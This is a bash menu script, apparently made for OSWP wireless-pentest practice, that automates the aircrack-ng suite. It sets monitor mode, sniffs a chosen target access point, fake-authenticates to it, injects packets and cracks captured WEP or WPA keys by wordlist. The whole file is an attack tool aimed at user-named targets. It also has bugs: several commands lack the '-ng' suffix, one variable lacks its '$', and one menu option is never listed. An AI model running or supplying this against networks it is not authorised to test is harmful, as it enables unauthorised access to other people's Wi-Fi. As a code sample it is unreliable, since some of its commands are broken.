#!/bin/bash
while :; do
echo "Welcome to Wi-fu OSWP Automated v1"
echo "Created by Joas"
echo ""
echo ""
echo "Option 1: Airmon-ng"
echo "Option 2: Airodump-ng"
echo "Option 3: Aireplay-ng"
echo "Option 4: Aircrack-ng"
echo ""
read -p "Select option: " op

if [ $op -eq 1 ];
then
	echo "Welcome to airmon-ng"
	echo ""
	echo "1 - monitor check kill"
	echo "2 - monitor start"
	echo "3 - monitor stop"
	read -p "Select airmon-ng options: " airmon
	if [ $airmon -eq 1 ];
	then
		echo "airmon check kill"
		echo ""
		airmon-ng check kill
	elif [ $airmon -eq 2 ];
	then
		echo "airmon monitor start"
		echo ""
		read -p "Select your interface wireless: " inface
		airmon-ng start $inface
	elif [ $airmon -eq 3 ];
	then	
		echo "airmon monitor stop"
		echo ""
		read -p "Select your interface wireless monitor: " infacem
		airmon-ng stop $infacem 
	else
		echo "Finish Monitor"
	fi
elif [ $op -eq 2 ];
then
	echo "Welcome to Airodump-ng"
	echo ""
	echo "1 - Basic Sniffing"
	echo "2 - Advanced Sniffing"
	read -p "Select airodump-ng option: " airodump
	if [ $airodump -eq 1 ];
	then
		echo "airodump basic sniffing" 
		echo ""
		read -p "Select you interface wireless monitor: " infacem2
		airodump-ng $infacem2
		echo ""
	elif [ $airodump -eq 2 ];
	then
		echo "airodump advanced sniffing"
		echo ""
		read -p "Select channel of target: " channel
		read -p "Select bssid of target: " bssid
		read -p "select filename of capture packets target: " file
		read -p "select you interface wireless monitor: " infacem3
		airodump-ng -c $channel --bssid $bssid -w $file $infacem3
		echo ""
	else
		echo "Finish Airodump"
	fi
elif [ $op -eq 3 ];
then
	echo "Welcome to Aireplay"
	echo ""
	echo "1 - Injection Testing"
	echo "2 - Fake authentication associate with AP"
	echo ""
	read -p "Select aireplay option: " aireplay
	if [ $aireplay -eq 1 ];
	then
		echo "Injection Testing"
		echo ""
		read -p "Select your interface wireless: " infacem4
		aireplay -9 $infacem4
	elif [ $aireplay -eq 2 ];
	then
		echo "Fake authentication"
		echo ""
		read -p "Select ESSID of target: " essid2
		read -p "Select BSSID of target: " bssid2
		read -p "Select client: " attmac
		read -p "Select your interface wireless: " infacem5
		aireplay-ng -1 0 -e $essid2 -a $bssid2 -h $attmac infacem5
	elif [ $aireplay -eq 3 ];
	then
		echo "Other Options"
		echo "Consult: https://www.aircrack-ng.org/doku.php?id=pt-br:aireplay-ng"
		echo ""
		read -p "Select options attack: " attack1
		read -p "Select filter: " macadd1
		read -p "Select BSSID of target: " bssid3
		read -p "Select filter: " macadd2
		read -p "Select ESSID of target" essid3
		read -p "Select your interface wireless: " infacem6
		read -p "Other options: " otheroptions
		echo ""
		aireplay $attack1 $macadd1 $bssid3 $macadd2 -e $essid3 $otheroptions $infacem6
	else
		echo "Finish aireplay-ng"
	fi
elif [ $op -eq 4 ];
then
	echo "Welcome to Aircrack"
	echo ""
	echo "1 - Cracking 64 bits"
	echo "2 - Cracking wordlist"
	echo ""
	read -p "Select aircrack option: " aircrack
	if [ $aircrack -eq 1 ];
	then
		echo "Cracking 64 bit"
		echo ""
		read -p "Select capturefile: " capturefile
		aircrack-ng -0 -z -n 64 $capturefile
	elif [ $aircrack -eq 2 ];
	then
		echo "Cracking wordlist"
		echo ""
		read -p "Select wordlist: " wordlist
		read -p "Select capturefile: " capturefile2
		aircrack-ng -w $wordlist $capturefile2
	else
		echo "Finish Aircrack-ng"
	fi
else
	echo ""
	echo "CTRL+C to Finish"
	echo ""
fi
done
